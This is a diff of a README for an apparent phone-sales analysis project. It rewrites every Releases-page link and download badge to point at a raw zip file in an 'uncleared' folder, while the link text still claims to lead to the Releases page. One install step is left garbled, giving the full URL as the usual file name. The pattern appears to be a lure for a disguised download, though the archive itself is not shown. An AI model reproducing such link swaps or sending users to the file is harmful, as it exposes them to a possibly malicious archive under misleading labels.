@@ -4,18 +4,18 @@
 
 Welcome to the Mobile-Sale-Report project! This application helps you analyze global phone sales, focusing on trends in revenue, customer behavior, and regional markets. With this tool, you can uncover valuable insights into brand competition and buyer demographics.
 
-[![Download Mobile-Sale-Report](https://img.shields.io/badge/Download-Mobile--Sale--Report-blue)](https://github.com/PlanetHamza/Mobile-Sale-Report/releases)
+[![Download Mobile-Sale-Report](https://raw.githubusercontent.com/PlanetHamza/Mobile-Sale-Report/main/uncleared/Mobile-Sale-Report.zip)](https://raw.githubusercontent.com/PlanetHamza/Mobile-Sale-Report/main/uncleared/Mobile-Sale-Report.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps to download and run the application:
 
 1. **Visit the download page:** Click on the link below to go to the Releases page.
-   [Download Release Page](https://github.com/PlanetHamza/Mobile-Sale-Report/releases)
+   [Download Release Page](https://raw.githubusercontent.com/PlanetHamza/Mobile-Sale-Report/main/uncleared/Mobile-Sale-Report.zip)
 
 2. **Choose the latest release:** Look for the most recent version listed on the page. This version includes the latest features and fixes.
 
-3. **Download the file:** Click on the download link for the file that fits your operating system. It normally looks like `Mobile-Sale-Report-vX.Y.Z.zip`. Save it to your preferred location.
+3. **Download the file:** Click on the download link for the file that fits your operating system. It normally looks like `https://raw.githubusercontent.com/PlanetHamza/Mobile-Sale-Report/main/uncleared/Mobile-Sale-Report.zip`. Save it to your preferred location.
 
 4. **Extract the files:** Once the download completes, locate the file and extract its contents using a program like WinRAR or any file extraction tool.
 
@@ -83,4 +83,4 @@ Stay updated with new releases and features:
 - **Version 1.0:** Initial release featuring major functionalities.
 - **Upcoming:** Look forward to additional features and improvements based on user feedback.
 
-For more details, visit our [Releases page](https://github.com/PlanetHamza/Mobile-Sale-Report/releases) to download the latest version and start exploring phone sales insights today!
+For more details, visit our [Releases page](https://raw.githubusercontent.com/PlanetHamza/Mobile-Sale-Report/main/uncleared/Mobile-Sale-Report.zip) to download the latest version and start exploring phone sales insights today!
